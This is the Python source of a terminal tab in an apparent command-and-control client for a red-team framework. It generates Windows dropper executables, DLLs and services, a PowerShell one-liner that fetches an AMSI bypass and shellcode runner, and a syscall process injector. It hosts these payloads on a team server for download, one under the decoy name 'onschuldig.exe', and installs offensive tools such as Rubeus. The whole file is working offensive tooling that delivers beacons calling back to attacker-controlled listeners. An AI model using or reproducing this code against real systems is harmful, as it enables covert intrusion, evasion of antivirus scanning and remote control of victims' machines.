import sys
import os
import time
import random
import string 
from threading import Thread, Lock
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from PyQt5.QtCore import *

from grpcClient import *


#
# Dropper modules
#
if os.path.exists(os.path.join(os.getcwd(), 'PowershellWebDelivery')):
    sys.path.insert(1, './PowershellWebDelivery/')
    import GeneratePowershellLauncher

if os.path.exists(os.path.join(os.getcwd(), 'PeDropper')):
    sys.path.insert(1, './PeDropper/')
    import GenerateDropperBinary

if os.path.exists(os.path.join(os.getcwd(), 'GoDroplets')):
    sys.path.insert(1, './GoDroplets/')
    import GoDroplets.scripts.GenerateGoDroplets as GenerateGoDroplets

if os.path.exists(os.path.join(os.getcwd(), 'PeInjectorSyscall')):
    sys.path.insert(1, './PeInjectorSyscall/')
    import GenerateInjector

sys.path.insert(1, './Batcave')
import batcave
#
# Constant
#
LogFileName = "Terminal.log"
HistoryFileName = ".termHistory"

HttpType = "http"
HttpsType = "https"

GrpcGetBeaconBinaryInstruction = "getBeaconBinary"
GrpcPutIntoUploadDirInstruction = "putIntoUploadDir"
GrpcInfoListenerInstruction = "infoListener"
GrpcBatcaveUploadToolInstruction = "batcaveUpload"

BeaconHttpFile = "BeaconHttp.exe"

ErrorInstruction = "Error"

HelpInstruction = "help"

BatcaveInstruction = "Batcave"
BatcaveHelp = """Batcave:
Install the given module locally or on the team server:
exemple:
- Batcave Install rubeus
- Batcave BundleInstall recon
- Batcave Search rec"""

GenerateInstruction = "Generate"
GenerateHelp = """Generate:
Generate a payload to deploy a beacon and store it on the client:
exemple:
- Generate WindowsExecutable listenerHash exe/dll/svc
- Generate GoWindowsExecutable listenerHash exe/dll/svc"""

WindowsExecutableInstruction = "WindowsExecutable"
WindowsExecutableHelp = """Generate WindowsExecutable:
Generate WindowsExecutable, generate 2 modules dropper, one EXE and one DLL from the appropriate beacon link to the given listener:
exemple:
- Generate WindowsExecutable listenerHash"""

GoWindowsExecutableInstruction = "GoWindowsExecutable"
GoWindowsExecutableHelp = """Generate GoWindowsExecutable:
Generate GoWindowsExecutable, generate 3 modules dropper compiled with go, one EXE, one DLL and one SVC from the appropriate beacon link to the given listener:
exemple:
- Generate GoWindowsExecutable listenerHash"""

GenerateAndHostInstruction = "GenerateAndHost"
GenerateAndHostHelp = """GenerateAndHost:
GenerateAndHost a playload that is store on the teamserver to be downloaded by a web request from a web listener (http/https):
exemple:
- GenerateAndHost PowershellWebDelivery listenerHash hostListenerHash
- GenerateAndHost PeInjectorSyscall processToInject listenerHash hostListenerHash"""

PowershellWebDeliveryInstruction = "PowershellWebDelivery"
PowershellWebDeliveryHelp = """GenerateAndHost PowershellWebDelivery:
Generate a powershell oneliner to download a AMSI bypass and a shellcode runner from a listener. The shellcode runner launch a beacon configured to connect back to the specified listener.
exemple:
- GenerateAndHost PowershellWebDelivery listenerHash
- GenerateAndHost PowershellWebDelivery listenerHash hostListenerHash"""

PeInjectorSyscallInstruction = "PeInjectorSyscall"
PeInjectorSyscallHelp = """GenerateAndHost PeInjectorSyscall:
exemple:
- GenerateAndHost PeInjectorSyscall processToInject listenerHash
- GenerateAndHost PeInjectorSyscall processToInject listenerHash hostListenerHash"""

HostInstruction = "Host"
HostHelp="""Host:
Host upload a file on the teamserver to be downloaded by a web request from a web listener (http/https):
exemple:
- Host file hostListenerHash"""

def getHelpMsg():
    helpText  = HelpInstruction+"\n"
    helpText += HostInstruction+"\n"
    helpText += GenerateInstruction+"\n"
    helpText += GenerateAndHostInstruction+"\n"
    return helpText

completerData = [
    (HelpInstruction,[]),
    (HostInstruction,[]),
    (GenerateInstruction,[
            (WindowsExecutableInstruction,[]),
            (GoWindowsExecutableInstruction,[]),
             ]),
    (GenerateAndHostInstruction,[
            (PowershellWebDeliveryInstruction,[]),
            ('PeInjectorSyscall',[]),
             ]),
    (BatcaveInstruction, [
            ("Install", []),
            ("BundleInstall", []),
            ("Search", [])
             ])
]

orangeText = '<p style=\"color:orange;white-space:pre\">[+] {} </p>'
redText = '<p style=\"color:red;white-space:pre\">[+] {} </p>'


#
# Terminal tab implementation
#
class Terminal(QWidget):
    tabPressed = pyqtSignal()
    logFileName=""

    def __init__(self, parent, ip, port, devMode):
        super(QWidget, self).__init__(parent)
        self.layout = QVBoxLayout(self)
        self.layout.setContentsMargins(0, 0, 0, 0)

        self.grpcClient = GrpcClient(ip, port, devMode)

        self.logFileName=LogFileName

        self.editorOutput = QPlainTextEdit()
        self.editorOutput.setFont(QFont("Courier"));
        self.editorOutput.setReadOnly(True)
        self.layout.addWidget(self.editorOutput, 8)

        self.commandEditor = CommandEditor()
        self.layout.addWidget(self.commandEditor, 2)
        self.commandEditor.returnPressed.connect(self.runCommand)

    def nextCompletion(self):
        index = self._compl.currentIndex()
        self._compl.popup().setCurrentIndex(index)
        start = self._compl.currentRow()
        if not self._compl.setCurrentRow(start + 1):
            self._compl.setCurrentRow(0)

    def event(self, event):
        if event.type() == QEvent.KeyPress and event.key() == Qt.Key_Tab:
            self.tabPressed.emit()
            return True
        return super().event(event)

    def runCommand(self):
        commandLine = self.commandEditor.displayText()
        self.commandEditor.clearLine()
        self.setCursorEditorAtEnd()

        if commandLine == "":
            line = '\n';
            self.editorOutput.insertPlainText(line)
        else:
            cmdHistoryFile = open(HistoryFileName, 'a')
            cmdHistoryFile.write(commandLine)
            cmdHistoryFile.write('\n')
            cmdHistoryFile.close()

            logFile = open("./logs/"+self.logFileName, 'a')
            logFile.write('[+] send: \"' + commandLine + '\"')
            logFile.write('\n')
            logFile.close()

            self.commandEditor.setCmdHistory()
            instructions = commandLine.split()
            if len(instructions) < 1:
                return;

            if instructions[0]==HelpInstruction:
                self.runHelp()

            elif instructions[0]==BatcaveInstruction:
                self.runBatcave(commandLine, instructions)

            elif instructions[0]==GenerateInstruction:
                self.runGenerate(commandLine, instructions)

            elif instructions[0]==GenerateAndHostInstruction:
                self.runGenerateAndHost(commandLine, instructions)
            
            elif instructions[0]==HostInstruction:
                self.runHost(commandLine, instructions)
            
            else:
                self.editorOutput.appendHtml(redText.format(commandLine))
                line = '\n' + "Error: Command Unknown"  + '\n';
                self.editorOutput.insertPlainText(line)

        self.setCursorEditorAtEnd()


    def runHelp(self):
        self.editorOutput.appendHtml(orangeText.format("help"))
        line = '\n' + getHelpMsg()  + '\n';
        self.editorOutput.insertPlainText(line)


    def runBatcave(self, commandLine, instructions):
        if len(instructions) < 3:
            self.editorOutput.appendHtml(orangeText.format(commandLine))
            line = '\n' + BatcaveHelp  + '\n';
            self.editorOutput.insertPlainText(line)
            return;

        cmd = instructions[1]
        batgadget = instructions[2]

        if cmd == "Install":
            filePath = batcave.downloadBatGadget(batgadget)
            try:
                filename = os.path.basename(filePath)
                with open(filePath, mode='rb') as fileDesc:
                    payload = fileDesc.read()
            except IOError:
                self.editorOutput.appendHtml(orangeText.format(commandLine))
                line = '\n' + "Error: File or BatGadget does not appear to exist." + '\n';
                self.editorOutput.insertPlainText(line)
                return  

            commandTeamServer = GrpcBatcaveUploadToolInstruction + " " + filename
            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
            print("Sent " + commandTeamServer)
            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

            result = resultTermCommand.result
            print(result)

            self.editorOutput.appendHtml(orangeText.format(commandLine))
            line = result  + '\n';
            if result == "":
                line += f"Added {filename} to TeamServer Tools. You can now use it with other modules."
            self.editorOutput.insertPlainText(line)
            return    

        elif cmd == "BundleInstall":

            filePathList = batcave.downloadBatBundle(batgadget)
            self.editorOutput.appendHtml(orangeText.format(commandLine))
            line = "\n"
            for filePath in filePathList:
                try:
                    filename = os.path.basename(filePath)
                    with open(filePath, mode='rb') as fileDesc:
                        payload = fileDesc.read()
                except IOError:
                    self.editorOutput.appendHtml(orangeText.format(commandLine))
                    line = '\n' + "Error: File or BatGadget does not appear to exist." + '\n';
                    self.editorOutput.insertPlainText(line)
                    return  

                commandTeamServer = GrpcBatcaveUploadToolInstruction + " " + filename
                termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
                resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

                result = resultTermCommand.result

                if result == "":
                    line += f" - Added {filename} to TeamServer Tools. You can now use it with other modules. \n"
                else:
                    line += result  + '\n'
            self.editorOutput.insertPlainText(line)
            self.editorOutput.insertPlainText(f"BatBundle {batgadget} successfully installed !\n")

        elif cmd == "Search":
            result = batcave.searchTheBatcave(batgadget)
            self.editorOutput.appendHtml(orangeText.format(commandLine))
            line = '\n' + result  + '\n';
            self.editorOutput.insertPlainText(line)
            return    

        else:
            self.editorOutput.appendHtml(orangeText.format(commandLine))
            line = '\n' + "unkown instrution"  + '\n';
            self.editorOutput.insertPlainText(line)
            return     


    #
    # Host
    # 
    def runHost(self, commandLine, instructions):
        if len(instructions) < 3:
            self.editorOutput.appendHtml(orangeText.format(commandLine))
            line = '\n' + HostHelp  + '\n';
            self.editorOutput.insertPlainText(line)
            return;

        filePath = instructions[1]
        hostListenerHash = instructions[2]

        commandTeamServer = GrpcInfoListenerInstruction+" "+hostListenerHash
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.editorOutput.appendHtml(orangeText.format(commandLine))
            line = '\n' + result  + '\n';
            self.editorOutput.insertPlainText(line)
            return        

        results = result.split("\n")
        if len(results)<4:
            return

        schemeDownload = results[0]
        ipDownload = results[1]
        portDownload = results[2]
        downloadPath = results[3]
        if not downloadPath:
            error = "Error: Download listener must be of type http or https."
            self.editorOutput.insertPlainText(error)
            return

        if downloadPath[0]=="/":
            downloadPath = downloadPath[1:]

        # Upload the file and get the path
        try:
            filename = os.path.basename(filePath)
            with open(filePath, mode='rb') as fileDesc:
                payload = fileDesc.read()
        except IOError:
            self.editorOutput.appendHtml(orangeText.format(commandLine))
            line = '\n' + "Error: File does not appear to exist." + '\n';
            self.editorOutput.insertPlainText(line)
            return  

        commandTeamServer = GrpcPutIntoUploadDirInstruction+" "+hostListenerHash+" "+filename
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.editorOutput.appendHtml(orangeText.format(commandLine))
            line = '\n' + result  + '\n';
            self.editorOutput.insertPlainText(line)
            return  
                
        result =  schemeDownload + "://" + ipDownload + ":" + portDownload + "/" + downloadPath + filename
        self.editorOutput.appendHtml(orangeText.format(commandLine))
        line = '\n' + result  + '\n';
        self.editorOutput.insertPlainText(line)


    #
    # runGenerate
    #   
    def runGenerate(self, commandLine, instructions):
        if len(instructions) < 2:
            self.editorOutput.appendHtml(orangeText.format(commandLine))
            line = '\n' + GenerateHelp  + '\n';
            self.editorOutput.insertPlainText(line)
            return; 

        mode = instructions[1]
        if mode == WindowsExecutableInstruction or mode == GoWindowsExecutableInstruction:
            if len(instructions) < 3 and mode == WindowsExecutableInstruction:
                self.editorOutput.appendHtml(orangeText.format(commandLine))
                line = '\n' + WindowsExecutableHelp  + '\n';
                self.editorOutput.insertPlainText(line)
                return; 
            
            elif len(instructions) < 3 and mode == GoWindowsExecutableInstruction:
                self.editorOutput.appendHtml(orangeText.format(commandLine))
                line = '\n' + GoWindowsExecutableHelp  + '\n';
                self.editorOutput.insertPlainText(line)
                return; 

            listener = instructions[2]

            commandTeamServer = GrpcInfoListenerInstruction+" "+listener
            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)    

            result = resultTermCommand.result
            if ErrorInstruction in result:
                self.editorOutput.appendHtml(orangeText.format(commandLine))
                line = '\n' + result  + '\n';
                self.editorOutput.insertPlainText(line)
                return   

            results = result.split("\n")
            if len(results)<4:
                return

            scheme = results[0]
            ip = results[1]
            port = results[2]

            commandTeamServer = GrpcGetBeaconBinaryInstruction+" "+listener
            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

            result = resultTermCommand.result
            if ErrorInstruction in result:
                self.editorOutput.appendHtml(orangeText.format(commandLine))
                line = '\n' + result  + '\n';
                self.editorOutput.insertPlainText(line)
                return   

            print("Beacon size", len(resultTermCommand.data))
            beaconFilePath = "./"+BeaconHttpFile
            beaconFile = open(beaconFilePath, "wb")
            beaconFile.write(resultTermCommand.data)

            beaconArg = ip+" "+port
            if scheme==HttpType or scheme==HttpsType:
                beaconArg = beaconArg+" "+scheme

            if mode == GoWindowsExecutableInstruction:
                formatOutput = "all"                    
                if len(instructions) >= 4 and (instructions[3] in ["exe","dll","svc","all"]) :
                    formatOutput = instructions[3]

                exeName = listener+"_"+scheme
                self.editorOutput.appendHtml(orangeText.format(commandLine))
                line += "\n Generating GoDroplets Please Wait ....."

                res = GenerateGoDroplets.generateGoDroplets(beaconFilePath, beaconArg, formatOutput, exeName)

                if not "".join(res):
                    line = '\n' + "Error: GoWindowsExecutable failed. Check if go is correctly installed."  + '\n';
                    self.editorOutput.insertPlainText(line)
                    return   

                toprint = "\nGenerated the Following:\n"
                toprint += ("\n").join(res)
                self.editorOutput.insertPlainText(toprint)
                return

            elif mode == WindowsExecutableInstruction:
                # launch PeDropper
                dropperExePath, dropperDllPath = GenerateDropperBinary.generatePayloads(beaconFilePath, beaconArg, "")

                result =  "Dropper EXE path: " + dropperExePath + "\n"
                result += "Dropper DLL path: " + dropperDllPath 
                self.editorOutput.appendHtml(orangeText.format(commandLine))
                line = '\n' + result  + '\n';
                self.editorOutput.insertPlainText(line)
                return
            
        else:
            self.editorOutput.appendHtml(redText.format(commandLine))
            helpMsg = """Error: Mode not recognised"""
            line = '\n' + helpMsg  + '\n';
            self.editorOutput.insertPlainText(line)
            return;


    #
    # GenerateAndHost 
    #
    def runGenerateAndHost(self, commandLine, instructions):
        if len(instructions) < 2:
            self.editorOutput.appendHtml(orangeText.format(commandLine))
            line = '\n' + GenerateAndHostHelp  + '\n';
            self.editorOutput.insertPlainText(line)
            return;

        mode = instructions[1]

        if mode == PowershellWebDeliveryInstruction:
            if len(instructions) < 3:
                self.editorOutput.appendHtml(orangeText.format(commandLine))
                line = '\n' + PowershellWebDeliveryHelp  + '\n';
                self.editorOutput.insertPlainText(line)
                return;
            
            # should take 2 listeners: 
            #   the http/https listener to download the payload from
            #   one listner for the beacon to connect to
            listenerBeacon = instructions[2]
            if  len(instructions) >= 4:
                listenerDownload = instructions[3]
            else:
                listenerDownload = listenerBeacon

            self.GenerateAndHostPowershellWebDelivery(commandLine, listenerDownload, listenerBeacon)

        elif mode == PeInjectorSyscallInstruction:
            if len(instructions) < 4:
                self.editorOutput.appendHtml(orangeText.format(commandLine))
                line = '\n' + PeInjectorSyscallHelp  + '\n';
                self.editorOutput.insertPlainText(line)
                return;
            
            # should take 2 listeners: 
            #   the http/https listener to download the payload from
            #   one listner for the beacon to connect to
            processToInject = instructions[2]
            listenerBeacon = instructions[3]
            if  len(instructions) >= 5:
                listenerDownload = instructions[4]
            else:
                listenerDownload = listenerBeacon

            self.GenerateAndHostPeInjectorSyscall(commandLine, listenerDownload, listenerBeacon, processToInject)
    
        else:
            self.editorOutput.appendHtml(redText.format(commandLine))
            helpMsg = """Error: Mode not recognised"""
            line = '\n' + helpMsg  + '\n';
            self.editorOutput.insertPlainText(line)
            return;


    #
    # GenerateAndHostPowershellWebDelivery
    #
    def GenerateAndHostPowershellWebDelivery(self, commandLine,  listenerDownload, listenerBeacon):
        commandTeamServer = GrpcInfoListenerInstruction+" "+listenerDownload
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.editorOutput.appendHtml(orangeText.format(commandLine))
            line = '\n' + result  + '\n';
            self.editorOutput.insertPlainText(line)
            return        

        results = result.split("\n")
        if len(results)<4:
            return

        schemeDownload = results[0]
        ipDownload = results[1]
        portDownload = results[2]
        downloadPath = results[3]
        if not downloadPath:
            error = "Error: Download listener must be of type http or https."
            self.editorOutput.insertPlainText(error)
            return

        if downloadPath[0]=="/":
            downloadPath = downloadPath[1:]

        if  listenerBeacon != listenerDownload:
            commandTeamServer = GrpcInfoListenerInstruction+" "+listenerBeacon
            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)    

            result = resultTermCommand.result
            if ErrorInstruction in result:
                self.editorOutput.appendHtml(orangeText.format(commandLine))
                line = '\n' + result  + '\n';
                self.editorOutput.insertPlainText(line)
                return   

            results = result.split("\n")
            if len(results)<4:
                return

            scheme = results[0]
            ip = results[1]
            port = results[2]
        else:
            scheme=schemeDownload
            ip=ipDownload
            port=portDownload

        commandTeamServer = GrpcGetBeaconBinaryInstruction+" "+listenerBeacon
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.editorOutput.appendHtml(orangeText.format(commandLine))
            line = '\n' + result  + '\n';
            self.editorOutput.insertPlainText(line)
            return   

        print("Beacon size", len(resultTermCommand.data))
        beaconFilePath = "./"+BeaconHttpFile
        beaconFile = open(beaconFilePath, "wb")
        beaconFile.write(resultTermCommand.data)

        beaconArg = ip+" "+port
        if scheme==HttpType or scheme==HttpsType:
            beaconArg = beaconArg+" "+scheme

        # Generate the 2 files
        payloadAmsi, payloadShellcodeRunner = GeneratePowershellLauncher.generatePayloads(beaconFilePath, beaconArg, "")

        # Upload the 2 files and get the path
        filename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        pathAmsiBypass = downloadPath
        pathAmsiBypass = pathAmsiBypass + filename
        commandTeamServer = GrpcPutIntoUploadDirInstruction+" "+listenerDownload+" "+filename
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payloadAmsi.encode("utf-8"))
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.editorOutput.appendHtml(orangeText.format(commandLine))
            line = '\n' + result  + '\n';
            self.editorOutput.insertPlainText(line)
            return  

        filename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        pathShellcodeRunner = downloadPath
        pathShellcodeRunner = pathShellcodeRunner + filename
        commandTeamServer = GrpcPutIntoUploadDirInstruction+" "+listenerDownload+" "+filename
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payloadShellcodeRunner.encode("utf-8"))
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.editorOutput.appendHtml(orangeText.format(commandLine))
            line = '\n' + result  + '\n';
            self.editorOutput.insertPlainText(line)
            return  

        # upload the 2 file to the server, get the url to reach them
        # generate the oneliner
        oneLiner = GeneratePowershellLauncher.generateOneLiner(ipDownload, portDownload, scheme, pathAmsiBypass, pathShellcodeRunner)

        self.editorOutput.appendHtml(orangeText.format(commandLine))
        line = '\n' + oneLiner  + '\n';
        self.editorOutput.insertPlainText(line)


    #
    # GenerateAndHostPeInjectorSyscall
    #
    def GenerateAndHostPeInjectorSyscall(self, commandLine,  listenerDownload, listenerBeacon, processToInject):
        commandTeamServer = GrpcInfoListenerInstruction+" "+listenerDownload
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.editorOutput.appendHtml(orangeText.format(commandLine))
            line = '\n' + result  + '\n';
            self.editorOutput.insertPlainText(line)
            return        

        results = result.split("\n")
        if len(results)<4:
            return

        schemeDownload = results[0]
        ipDownload = results[1]
        portDownload = results[2]
        downloadPath = results[3]
        if not downloadPath:
            error = "Error: Download listener must be of type http or https."
            self.editorOutput.insertPlainText(error)
            return

        if downloadPath[0]=="/":
            downloadPath = downloadPath[1:]

        if  listenerBeacon != listenerDownload:
            commandTeamServer = GrpcInfoListenerInstruction+" "+listenerBeacon
            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)    

            result = resultTermCommand.result
            if ErrorInstruction in result:
                self.editorOutput.appendHtml(orangeText.format(commandLine))
                line = '\n' + result  + '\n';
                self.editorOutput.insertPlainText(line)
                return   

            results = result.split("\n")
            if len(results)<4:
                return

            scheme = results[0]
            ip = results[1]
            port = results[2]
        else:
            scheme=schemeDownload
            ip=ipDownload
            port=portDownload

        commandTeamServer = GrpcGetBeaconBinaryInstruction+" "+listenerBeacon
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.editorOutput.appendHtml(orangeText.format(commandLine))
            line = '\n' + result  + '\n';
            self.editorOutput.insertPlainText(line)
            return   

        print("Beacon size", len(resultTermCommand.data))
        beaconFilePath = "./"+BeaconHttpFile
        beaconFile = open(beaconFilePath, "wb")
        beaconFile.write(resultTermCommand.data)

        beaconArg = ip+" "+port
        if scheme==HttpType or scheme==HttpsType:
            beaconArg = beaconArg+" "+scheme

        # Generate the 2 files
        process = processToInject
        filename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(15))
        urlStage =  schemeDownload + "://" + ipDownload + ":" + portDownload + "/" + downloadPath + filename

        if not os.path.exists(os.path.join(os.getcwd(), 'PeInjectorSyscall')):
            self.editorOutput.appendHtml(orangeText.format(commandLine))
            line = '\n' + "PeInjectorSyscall module not found"  + '\n';
            self.editorOutput.insertPlainText(line)
            return  

        dropperExePath, shellcodePath = GenerateInjector.generatePayloads(beaconFilePath, beaconArg, "", process, urlStage)

        # Upload the file and get the path
        try:
            with open(dropperExePath, mode='rb') as fileDesc:
                payload = fileDesc.read()
        except IOError:
            self.editorOutput.appendHtml(redText.format(commandLine))
            line = '\n' + "Error: File does not appear to exist." + '\n';
            self.editorOutput.insertPlainText(line)
            return  

        commandTeamServer = GrpcPutIntoUploadDirInstruction+" "+listenerDownload+" "+"onschuldig.exe"
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.editorOutput.appendHtml(orangeText.format(commandLine))
            line = '\n' + result  + '\n';
            self.editorOutput.insertPlainText(line)
            return  
                
        try:
            with open(shellcodePath, mode='rb') as fileDesc:
                payload = fileDesc.read()
        except IOError:
            self.editorOutput.appendHtml(redText.format(commandLine))
            line = '\n' + "Error: File does not appear to exist." + '\n';
            self.editorOutput.insertPlainText(line)
            return  

        commandTeamServer = GrpcPutIntoUploadDirInstruction+" "+listenerDownload+" "+filename
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.editorOutput.appendHtml(orangeText.format(commandLine))
            line = '\n' + result  + '\n';
            self.editorOutput.insertPlainText(line)
            return  
                
        result =  schemeDownload + "://" + ipDownload + ":" + portDownload + "/" + downloadPath + "onschuldig.exe"
        self.editorOutput.appendHtml(orangeText.format(commandLine))
        line = '\n' + result  + '\n';
        self.editorOutput.insertPlainText(line)

    def setCursorEditorAtEnd(self):
        cursor = self.editorOutput.textCursor()
        cursor.movePosition(QTextCursor.End,)
        self.editorOutput.setTextCursor(cursor)


class CommandEditor(QLineEdit):
    tabPressed = pyqtSignal()
    cmdHistory = []
    idx = 0

    def __init__(self, parent=None):
        super().__init__(parent)

        if(os.path.isfile(HistoryFileName)):
            cmdHistoryFile = open(HistoryFileName)
            self.cmdHistory = cmdHistoryFile.readlines()
            self.idx=len(self.cmdHistory)-1
            cmdHistoryFile.close()

        QShortcut(Qt.Key_Up, self, self.historyUp)
        QShortcut(Qt.Key_Down, self, self.historyDown)

        self.codeCompleter = CodeCompleter(completerData, self)
        # needed to clear the completer after activation
        self.codeCompleter.activated.connect(self.onActivated)
        self.setCompleter(self.codeCompleter)
        self.tabPressed.connect(self.nextCompletion)

    def nextCompletion(self):
        index = self.codeCompleter.currentIndex()
        self.codeCompleter.popup().setCurrentIndex(index)
        start = self.codeCompleter.currentRow()
        if not self.codeCompleter.setCurrentRow(start + 1):
            self.codeCompleter.setCurrentRow(0)

    def event(self, event):
        if event.type() == QEvent.KeyPress and event.key() == Qt.Key_Tab:
            self.tabPressed.emit()
            return True
        return super().event(event)

    def historyUp(self):
        if(self.idx<len(self.cmdHistory) and self.idx>=0):
            cmd = self.cmdHistory[self.idx%len(self.cmdHistory)]
            self.idx=max(self.idx-1,0)
            self.setText(cmd.strip())

    def historyDown(self):
        if(self.idx<len(self.cmdHistory) and self.idx>=0):
            self.idx=min(self.idx+1,len(self.cmdHistory)-1)
            cmd = self.cmdHistory[self.idx%len(self.cmdHistory)]
            self.setText(cmd.strip())

    def setCmdHistory(self):
        cmdHistoryFile = open('.termHistory')
        self.cmdHistory = cmdHistoryFile.readlines()
        self.idx=len(self.cmdHistory)-1
        cmdHistoryFile.close()

    def clearLine(self):
        self.clear()

    def onActivated(self):
        QTimer.singleShot(0, self.clear)


class CodeCompleter(QCompleter):
    ConcatenationRole = Qt.UserRole + 1

    def __init__(self, data, parent=None):
        super().__init__(parent)
        self.createModel(data)

    def splitPath(self, path):
        return path.split(' ')

    def pathFromIndex(self, ix):
        return ix.data(CodeCompleter.ConcatenationRole)

    def createModel(self, data):
        def addItems(parent, elements, t=""):
            for text, children in elements:
                item = QStandardItem(text)
                data = t + " " + text if t else text
                item.setData(data, CodeCompleter.ConcatenationRole)
                parent.appendRow(item)
                if children:
                    addItems(item, children, data)
        model = QStandardItemModel(self)
        addItems(model, data)
        self.setModel(model)
